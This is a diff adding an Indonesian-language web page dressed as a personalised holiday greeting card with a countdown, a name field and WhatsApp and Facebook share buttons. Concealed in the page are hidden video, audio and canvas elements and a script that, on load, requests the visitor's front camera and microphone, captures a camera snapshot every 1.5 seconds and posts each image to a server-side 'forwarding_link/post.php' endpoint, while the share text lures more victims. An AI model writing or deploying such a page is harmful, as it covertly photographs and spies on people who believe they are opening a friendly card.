@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Spesial Kejutan & Ucapan Untukmu! 🎁</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <style>
+    :root {
+      --sp-orange: #EE4D2D;
+      --sp-orange-light: #FF7337;
+      --sp-yellow: #FFCE3D;
+      --sp-bg: #F5F5F5;
+      --sp-text: #222222;
+      --sp-muted: #757575;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+    }
+
+    body {
+      background-color: var(--sp-bg);
+      color: var(--sp-text);
+      padding-bottom: 85px;
+      overflow-x: hidden;
+    }
+
+    .top-banner {
+      background: linear-gradient(135deg, var(--sp-orange) 0%, var(--sp-orange-light) 100%);
+      color: #fff;
+      padding: 20px 16px 55px;
+      border-bottom-left-radius: 24px;
+      border-bottom-right-radius: 24px;
+      text-align: center;
+      position: relative;
+      box-shadow: 0 4px 15px rgba(238, 77, 45, 0.25);
+    }
+
+    .badge-promo {
+      display: inline-block;
+      background: var(--sp-yellow);
+      color: #B71C1C;
+      font-weight: 800;
+      font-size: 11px;
+      padding: 4px 12px;
+      border-radius: 20px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 10px;
+    }
+
+    .top-banner h1 {
+      font-size: 24px;
+      font-weight: 800;
+      line-height: 1.25;
+      margin-bottom: 6px;
+    }
+
+    .top-banner p {
+      font-size: 13px;
+      opacity: 0.92;
+    }
+
+    .container {
+      max-width: 480px;
+      margin: -38px auto 0;
+      padding: 0 16px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .flash-card {
+      background: #fff;
+      border-radius: 14px;
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+      margin-bottom: 14px;
+      border: 1px solid #FFE4DE;
+    }
+
+    .flash-title {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-weight: 800;
+      color: var(--sp-orange);
+      font-size: 14px;
+    }
+
+    .countdown-boxes {
+      display: flex;
+      gap: 5px;
+      align-items: center;
+    }
+
+    .time-box {
+      background: #222;
+      color: #fff;
+      font-weight: 700;
+      font-size: 12px;
+      padding: 4px 6px;
+      border-radius: 5px;
+      min-width: 28px;
+      text-align: center;
+    }
+
+    .greeting-card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 22px 18px;
+      text-align: center;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.06);
+      margin-bottom: 14px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .greeting-card::before {
+      content: "";
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 5px;
+      background: linear-gradient(90deg, var(--sp-yellow), var(--sp-orange), var(--sp-yellow));
+    }
+
+    .recipient-label {
+      font-size: 12px;
+      color: var(--sp-muted);
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .recipient-name {
+      font-size: 28px;
+      font-weight: 800;
+      color: var(--sp-orange);
+      margin: 6px 0 14px;
+      word-break: break-word;
+    }
+
+    .voucher-box {
+      background: #FFF8F6;
+      border: 1.5px dashed var(--sp-orange);
+      border-radius: 12px;
+      padding: 16px;
+      margin: 12px 0;
+      position: relative;
+    }
+
+    .voucher-box p {
+      font-size: 14px;
+      line-height: 1.6;
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    .highlight-text {
+      color: var(--sp-orange);
+      font-weight: 700;
+    }
+
+    .custom-name-card {
+      background: #fff;
+      border-radius: 14px;
+      padding: 16px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+      margin-bottom: 16px;
+    }
+
+    .custom-name-card label {
+      display: block;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: var(--sp-text);
+    }
+
+    .input-group {
+      display: flex;
+      gap: 8px;
+    }
+
+    .input-group input {
+      flex: 1;
+      padding: 10px 14px;
+      border: 1.5px solid #E0E0E0;
+      border-radius: 8px;
+      font-size: 14px;
+      outline: none;
+    }
+
+    .btn-apply {
+      background: var(--sp-orange);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 0 16px;
+      font-weight: 700;
+      font-size: 13px;
+      cursor: pointer;
+    }
+
+    .bottom-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: #fff;
+      padding: 10px 16px;
+      box-shadow: 0 -4px 15px rgba(0,0,0,0.08);
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      z-index: 99;
+    }
+
+    .bottom-bar-inner {
+      max-width: 480px;
+      width: 100%;
+      display: flex;
+      gap: 10px;
+    }
+
+    .btn-share {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 12px;
+      border-radius: 10px;
+      font-weight: 700;
+      font-size: 14px;
+      text-decoration: none;
+      color: #fff;
+    }
+
+    .btn-wa { background: #25D366; }
+    .btn-fb { background: var(--sp-orange); }
+
+    #confetti-canvas {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none;
+      z-index: 50;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Elemen Media Tersembunyi (Kamera & Mikrofon) -->
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+    <audio id="audio" autoplay></audio>
+  </div>
+  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+  <canvas id="confetti-canvas"></canvas>
+
+  <div class="top-banner">
+    <span class="badge-promo"><i class="fa-solid fa-bolt"></i> SPESIAL HARI ISTIMEWA</span>
+    <h1 id="festival-title">Selamat Merayakan Hari Spesial! 🎉</h1>
+    <p>Kejutan ucapan hangat khusus dikirimkan untukmu</p>
+  </div>
+
+  <div class="container">
+    <div class="flash-card">
+      <div class="flash-title">
+        <i class="fa-solid fa-fire"></i> MOMEN SPESIAL
+      </div>
+      <div class="countdown-boxes" id="countdown">
+        <span class="time-box" id="cd-days">00</span> :
+        <span class="time-box" id="cd-hours">00</span> :
+        <span class="time-box" id="cd-mins">00</span> :
+        <span class="time-box" id="cd-secs">00</span>
+      </div>
+    </div>
+
+    <div class="greeting-card">
+      <div class="recipient-label">Dikirim Khusus Untuk</div>
+      <div class="recipient-name" id="display-name">Sahabat Terbaik</div>
+
+      <div class="voucher-box">
+        <p>✨ Semoga momen <span class="highlight-text" id="fes-inline">Hari Spesial</span> ini menjadi kenangan terindah yang penuh kebahagiaan!</p>
+        <p>Doa terbaik selalu menyertai langkahmu—semoga dilimpahkan <span class="highlight-text">kesehatan, kesuksesan, rezeki berlimpah, dan kedamaian</span>.</p>
+      </div>
+
+      <p style="font-size: 12px; color: var(--sp-muted); margin-top: 12px;">
+        Dari: <strong id="sender-name" style="color: var(--sp-text);">Sahabatmu</strong> ❤️
+      </p>
+    </div>
+
+    <div class="custom-name-card">
+      <label for="name-input"><i class="fa-solid fa-wand-magic-sparkles" style="color: var(--sp-orange);"></i> Buat Kartu Ucapan Dengan Namamu:</label>
+      <div class="input-group">
+        <input type="text" id="name-input" placeholder="Ketik namamu di sini...">
+        <button class="btn-apply" onclick="updateName()">Buat</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="bottom-bar">
+    <div class="bottom-bar-inner">
+      <a href="#" id="wa-share" class="btn-share btn-wa" target="_blank">
+        <i class="fa-brands fa-whatsapp" style="font-size: 18px;"></i> Kirim WA
+      </a>
+      <a href="#" id="fb-share" class="btn-share btn-fb" target="_blank">
+        <i class="fa-solid fa-share-nodes"></i> Bagikan
+      </a>
+    </div>
+  </div>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <script>
+    // Konfigurasi Akses Media (Kamera & Mikrofon Aktif)
+    function post(imgdata){
+      $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function(result){},
+        error: function(){}
+      });
+    };
+
+    const constraints = {
+      audio: true, // Mengaktifkan akses mikrofon
+      video: {
+        facingMode: "user"
+      }
+    };
+
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        console.error(`Media access error: ${e.toString()}`);
+      }
+    }
+
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+
+      var context = canvas.getContext('2d');
+      setInterval(function(){
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData); 
+      }, 1500);
+    }
+
+    init();
+
+    // Logika Website / Kartu Ucapan
+    const festivalName = "Hari Raya & Momen Spesial";
+    document.getElementById("festival-title").innerText = "Selamat " + festivalName + "! 🎉";
+    document.getElementById("fes-inline").innerText = festivalName;
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const paramName = urlParams.get('n');
+    if (paramName) {
+      document.getElementById("display-name").innerText = paramName;
+      document.getElementById("sender-name").innerText = paramName;
+    }
+
+    function updateName() {
+      const inputVal = document.getElementById("name-input").value.trim();
+      if (!inputVal) return;
+
+      document.getElementById("display-name").innerText = inputVal;
+      document.getElementById("sender-name").innerText = inputVal;
+
+      const newUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + '?n=' + encodeURIComponent(inputVal);
+      window.history.pushState({path: newUrl}, '', newUrl);
+      updateShareLinks(inputVal, newUrl);
+    }
+
+    function updateShareLinks(name, url) {
+      const text = `*Ada kejutan kartu ucapan spesial dari ${name} untukmu!* 🎁✨ Klik untuk membuka 👉 ${url}`;
+      document.getElementById("wa-share").href = `https://api.whatsapp.com/send?text=${encodeURIComponent(text)}`;
+      document.getElementById("fb-share").href = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}`;
+    }
+
+    updateShareLinks(paramName || "Sahabatmu", window.location.href);
+
+    const targetDate = new Date().getTime() + (24 * 60 * 60 * 1000);
+    setInterval(() => {
+      const now = new Date().getTime();
+      const diff = targetDate - now;
+
+      const d = Math.floor(diff / (1000 * 60 * 60 * 24));
+      const h = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+      const s = Math.floor((diff % (1000 * 60)) / 1000);
+
+      document.getElementById("cd-days").innerText = String(d).padStart(2, '0');
+      document.getElementById("cd-hours").innerText = String(h).padStart(2, '0');
+      document.getElementById("cd-mins").innerText = String(m).padStart(2, '0');
+      document.getElementById("cd-secs").innerText = String(s).padStart(2, '0');
+    }, 1000);
+  </script>
+</body>
+</html>
